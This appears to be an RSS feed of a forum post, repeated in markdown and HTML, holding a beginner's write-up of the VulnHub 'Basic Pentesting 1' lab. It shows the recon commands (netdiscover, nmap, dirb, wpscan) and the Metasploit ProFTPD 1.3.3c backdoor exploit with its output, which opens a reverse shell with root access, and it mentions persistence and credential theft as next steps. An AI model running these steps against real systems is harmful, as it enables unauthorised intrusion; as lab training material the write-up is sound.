<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[VulnHub] Basic Pentesting 1</title>
    <link>https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172</link>
    <description>This is my solution to the Basic Pentesting: 1 challenge by Josiah Pierce. His challenge can be found on VulnHub at:

https://www.vulnhub.com/entry/basic-pentesting-1,216/

Let&#39;s get started.

## 0x00 Details
We are not provided the IP address of our target machine, so we had to use other means to look for it. My go to is to utilize `netdiscover` and leverage ARP to discover other hosts on the network.

```
    root@kali:~/Challenges/basic_pentesting_1# netdiscover -i eth0 -r 192.168.59.1/24

    192.168.59.1    00:50:56:c0:00:08     18    1080  Unknown vendor              
    192.168.59.254  00:50:56:f3:da:1e      2     120  Unknown vendor              
    192.168.59.2    00:50:56:ff:ef:e4      1      60  Unknown vendor              
    192.168.59.137  00:0c:29:dc:14:23      1      60  Unknown vendor
```

Of all the IP addresses that were returned, I know that my machine is .134 (not listed); therefore, the target machine is most likely .137.

## 0x01 Enumeration
Now that we have the target IP, we can start doing reconnaissance. Using nmap, I can see what ports and services may be running on the target:

```
    root@kali:~/Challenges/basic_pentesting_1# nmap -v -n -sV -A --reason -p- 192.168.59.137 -oN scan.txt
    
    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3c
    22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
    |   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
    |_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (EdDSA)
    80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: POST OPTIONS GET HEAD
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn&#39;t have a title (text/html).
    MAC Address: 00:0C:29:DC:14:23 (VMware)
```

Here&#39;s a quick breakdown of the flags I provided to nmap:
* -v : verbose output
* -n : do not perform DNS resolution
* -sV : probe the ports and report service/version information
* -A : enable OS detection, script scanning, and traceroute
* --reason : tell me why a port is in a particular state
* -oN : output the scan in normally formatted text

I also ran a 2nd scan and outputted it to XML format, so it could be easily imported into metasploit for later.

We scan see that we have FTP, SSH, and a webserver running on this target. As a last resort we could attempt to bruteforce our way into SSH using the user `marlinspike`, which can be found when booting up the Ubuntu instance. For now, let&#39;s start by checking out the website.


Navigating to http://192.168.59.137/ I am brought to a default &quot;It works!&quot; webpage. Checking the source provides no additional information and neither does the robots.txt file. I am not fully convinced that this webserver is running for no reason so I decide to use `dirb` to enumerate some directories for me.

```
    root@kali:~/Challenges/basic_pentesting_1# dirb http://192.168.59.137 /usr/share/dirb/wordlists/common.txt 
```

Our tool discovers a hidden directory listed as &quot;/secret&quot; and it turns out to be a Wordpress blog, which is slightly broken. The blog keeps trying to load additional content and styling from a &quot;vtcsec&quot; domain, which I later discovered is the hostname of our target. Since &quot;vtcsec&quot; doesn&#39;t resolve to anything for us, the blog&#39;s styling is all out of whack. I&#39;m sure if you go into your hosts file and map &quot;vtcsec&quot; to the correct local IP, it will fix the issue.
![Alt](upload://EyoljNlWT5EWVGiJ3xZFDroaip.jpeg)

Anyway, for my next trick...more enumeration! Since wordpress, more specifically wordpress plugins, is known to have vulnerabilities, I decide to take a quick stab at it with `wpscan`. Unfortunately, wpscan isn&#39;t able to give us much other than some version numbers and this:

```
    [+] Identified the following 1 user/s:
    +----+-------+-------------------+
    | Id | Login | Name              |
    +----+-------+-------------------+
    | 1  | admin | admin – My secret |
    +----+-------+-------------------+
    [!] Default first WordPress username &#39;admin&#39; is still used
```

Not really much use unless we want to bruteforce the admin account. Before we give up and just start guessing passwords there&#39;s one last service we haven&#39;t looked at, the FTP server that&#39;s running. 

## 0x02 Exploitation
Upon inspection, we can see that the exact software is &quot;ProFTPd 1.3.3c&quot;. A quick google search brings us here: https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor

Looks promising... :) 

Let&#39;s fire up metasploit, load in that scan we saved (optional), and see if we can pop a shell!

```
    msf &gt; use exploit/unix/ftp/proftpd_133c_backdoor
    msf exploit(proftpd_133c_backdoor) &gt; set RHOST 192.168.59.137
    msf exploit(proftpd_133c_backdoor) &gt; exploit -j
    [*] Exploit running as background job 0.
    
    [*] Started reverse TCP double handler on 192.168.59.134:4444 
    [*] 192.168.59.137:21 - Connecting to FTP server 192.168.59.137:21...
    [*] 192.168.59.137:21 - Connected to target FTP server.
    [*] 192.168.59.137:21 - Sending Backdoor Command
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo dTPZW0QDx1x7Cb4y;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket A
    [*] A: &quot;dTPZW0QDx1x7Cb4y\r\n&quot;
    [*] Matching...
    [*] B is input...
    [*] Command shell session 1 opened (192.168.59.134:4444 -&gt; 192.168.59.137:58120) at 2018-01-05 16:17:40 -0500
```

We got a shell! Let&#39;s drop down into it and see what we can find

```
    sessions -i 1
    [*] Starting interaction with 1...
    id
    uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

## 0x03 Conclusion
Looks like that remote exploit got us a root shell, the challenge is complete :) I snooped around the filesystem a little bit but found nothing of interest. No flags, not even in `/home/marlinspike`. If this were a target network we were compromising and not just this one machine, it is at this point we would want to try and maintain persistence. We could drop more backdoors, start passively listening on the network to discover more hosts or steal credentials, etc. That is out of the scope of this write-up though.

This challenge is definitely geared towards beginners and those wanting to get their feet wet with pentesting and compromising a target system. Not a whole lot of trickery or dead ends in this one. 

Thanks for reading.

_Shared from [my blog](https://medarkus.tech/2018/01/06/Basic-Pentesting-1/)_
_[Proof of ownership](https://medarkus.tech/proof.txt)_</description>
    
    <lastBuildDate>Thu, 05 Apr 2018 04:38:38 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[VulnHub] Basic Pentesting 1</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172/2</link>
        <pubDate>Sat, 05 May 2018 04:38:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6172-2</guid>
        <source url="https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172.rss">[VulnHub] Basic Pentesting 1</source>
      </item>
      <item>
        <title>[VulnHub] Basic Pentesting 1</title>
        <dc:creator><![CDATA[johnmarston]]></dc:creator>
        <description><![CDATA[
            <p>This is my solution to the Basic Pentesting: 1 challenge by Josiah Pierce. His challenge can be found on VulnHub at:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.vulnhub.com/static/img/favicon.ico" class="site-icon" width="64" height="64">
      <a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/" target="_blank" rel="noopener nofollow ugc">vulnhub.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:666/500;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/d/2d65ebeeac7eae48a8772bbf2d009f6a8c18e3c7_2_666x500.png" class="thumbnail" width="666" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/d/2d65ebeeac7eae48a8772bbf2d009f6a8c18e3c7_2_666x500.png, https://0x00sec.s3.amazonaws.com/original/3X/2/d/2d65ebeeac7eae48a8772bbf2d009f6a8c18e3c7.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/d/2d65ebeeac7eae48a8772bbf2d009f6a8c18e3c7.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/d/2d65ebeeac7eae48a8772bbf2d009f6a8c18e3c7_2_10x10.png"></div>

<h3><a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/" target="_blank" rel="noopener nofollow ugc">Basic Pentesting: 1</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Let’s get started.</p>
<h2>0x00 Details</h2>
<p>We are not provided the IP address of our target machine, so we had to use other means to look for it. My go to is to utilize <code>netdiscover</code> and leverage ARP to discover other hosts on the network.</p>
<pre><code class="lang-auto">    root@kali:~/Challenges/basic_pentesting_1# netdiscover -i eth0 -r 192.168.59.1/24

    192.168.59.1    00:50:56:c0:00:08     18    1080  Unknown vendor              
    192.168.59.254  00:50:56:f3:da:1e      2     120  Unknown vendor              
    192.168.59.2    00:50:56:ff:ef:e4      1      60  Unknown vendor              
    192.168.59.137  00:0c:29:dc:14:23      1      60  Unknown vendor
</code></pre>
<p>Of all the IP addresses that were returned, I know that my machine is .134 (not listed); therefore, the target machine is most likely .137.</p>
<h2>0x01 Enumeration</h2>
<p>Now that we have the target IP, we can start doing reconnaissance. Using nmap, I can see what ports and services may be running on the target:</p>
<pre><code class="lang-auto">    root@kali:~/Challenges/basic_pentesting_1# nmap -v -n -sV -A --reason -p- 192.168.59.137 -oN scan.txt
    
    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3c
    22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
    |   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
    |_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (EdDSA)
    80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: POST OPTIONS GET HEAD
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    MAC Address: 00:0C:29:DC:14:23 (VMware)
</code></pre>
<p>Here’s a quick breakdown of the flags I provided to nmap:</p>
<ul>
<li>-v : verbose output</li>
<li>-n : do not perform DNS resolution</li>
<li>-sV : probe the ports and report service/version information</li>
<li>-A : enable OS detection, script scanning, and traceroute</li>
<li>–reason : tell me why a port is in a particular state</li>
<li>-oN : output the scan in normally formatted text</li>
</ul>
<p>I also ran a 2nd scan and outputted it to XML format, so it could be easily imported into metasploit for later.</p>
<p>We scan see that we have FTP, SSH, and a webserver running on this target. As a last resort we could attempt to bruteforce our way into SSH using the user <code>marlinspike</code>, which can be found when booting up the Ubuntu instance. For now, let’s start by checking out the website.</p>
<p>Navigating to <a href="http://192.168.59.137/" rel="noopener nofollow ugc">http://192.168.59.137/</a> I am brought to a default “It works!” webpage. Checking the source provides no additional information and neither does the robots.txt file. I am not fully convinced that this webserver is running for no reason so I decide to use <code>dirb</code> to enumerate some directories for me.</p>
<pre><code class="lang-auto">    root@kali:~/Challenges/basic_pentesting_1# dirb http://192.168.59.137 /usr/share/dirb/wordlists/common.txt 
</code></pre>
<p>Our tool discovers a hidden directory listed as “/secret” and it turns out to be a Wordpress blog, which is slightly broken. The blog keeps trying to load additional content and styling from a “vtcsec” domain, which I later discovered is the hostname of our target. Since “vtcsec” doesn’t resolve to anything for us, the blog’s styling is all out of whack. I’m sure if you go into your hosts file and map “vtcsec” to the correct local IP, it will fix the issue.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d.jpeg" data-download-href="/uploads/short-url/EyoljNlWT5EWVGiJ3xZFDroaip.jpeg?dl=1" title="Alt" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d_2_544x499.jpeg" alt="Alt" data-base62-sha1="EyoljNlWT5EWVGiJ3xZFDroaip" width="544" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d_2_544x499.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d_2_816x748.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/04959590e7702b980a5ab22069b6190cf7637d6d_2_10x10.png"></a></div><p></p>
<p>Anyway, for my next trick…more enumeration! Since wordpress, more specifically wordpress plugins, is known to have vulnerabilities, I decide to take a quick stab at it with <code>wpscan</code>. Unfortunately, wpscan isn’t able to give us much other than some version numbers and this:</p>
<pre><code class="lang-auto">    [+] Identified the following 1 user/s:
    +----+-------+-------------------+
    | Id | Login | Name              |
    +----+-------+-------------------+
    | 1  | admin | admin – My secret |
    +----+-------+-------------------+
    [!] Default first WordPress username 'admin' is still used
</code></pre>
<p>Not really much use unless we want to bruteforce the admin account. Before we give up and just start guessing passwords there’s one last service we haven’t looked at, the FTP server that’s running.</p>
<h2>0x02 Exploitation</h2>
<p>Upon inspection, we can see that the exact software is “ProFTPd 1.3.3c”. A quick google search brings us here: <a href="https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor" rel="noopener nofollow ugc">https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor</a></p>
<p>Looks promising… <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Let’s fire up metasploit, load in that scan we saved (optional), and see if we can pop a shell!</p>
<pre><code class="lang-auto">    msf &gt; use exploit/unix/ftp/proftpd_133c_backdoor
    msf exploit(proftpd_133c_backdoor) &gt; set RHOST 192.168.59.137
    msf exploit(proftpd_133c_backdoor) &gt; exploit -j
    [*] Exploit running as background job 0.
    
    [*] Started reverse TCP double handler on 192.168.59.134:4444 
    [*] 192.168.59.137:21 - Connecting to FTP server 192.168.59.137:21...
    [*] 192.168.59.137:21 - Connected to target FTP server.
    [*] 192.168.59.137:21 - Sending Backdoor Command
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo dTPZW0QDx1x7Cb4y;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket A
    [*] A: "dTPZW0QDx1x7Cb4y\r\n"
    [*] Matching...
    [*] B is input...
    [*] Command shell session 1 opened (192.168.59.134:4444 -&gt; 192.168.59.137:58120) at 2018-01-05 16:17:40 -0500
</code></pre>
<p>We got a shell! Let’s drop down into it and see what we can find</p>
<pre><code class="lang-auto">    sessions -i 1
    [*] Starting interaction with 1...
    id
    uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
</code></pre>
<h2>0x03 Conclusion</h2>
<p>Looks like that remote exploit got us a root shell, the challenge is complete <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> I snooped around the filesystem a little bit but found nothing of interest. No flags, not even in <code>/home/marlinspike</code>. If this were a target network we were compromising and not just this one machine, it is at this point we would want to try and maintain persistence. We could drop more backdoors, start passively listening on the network to discover more hosts or steal credentials, etc. That is out of the scope of this write-up though.</p>
<p>This challenge is definitely geared towards beginners and those wanting to get their feet wet with pentesting and compromising a target system. Not a whole lot of trickery or dead ends in this one.</p>
<p>Thanks for reading.</p>
<p><em>Shared from <a href="https://medarkus.tech/2018/01/06/Basic-Pentesting-1/" rel="noopener nofollow ugc">my blog</a></em><br>
<em><a href="https://medarkus.tech/proof.txt" rel="noopener nofollow ugc">Proof of ownership</a></em></p>
          <p><a href="https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172/1</link>
        <pubDate>Thu, 05 Apr 2018 04:38:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6172-1</guid>
        <source url="https://0x00sec.org/t/vulnhub-basic-pentesting-1/6172.rss">[VulnHub] Basic Pentesting 1</source>
      </item>
  </channel>
</rss>
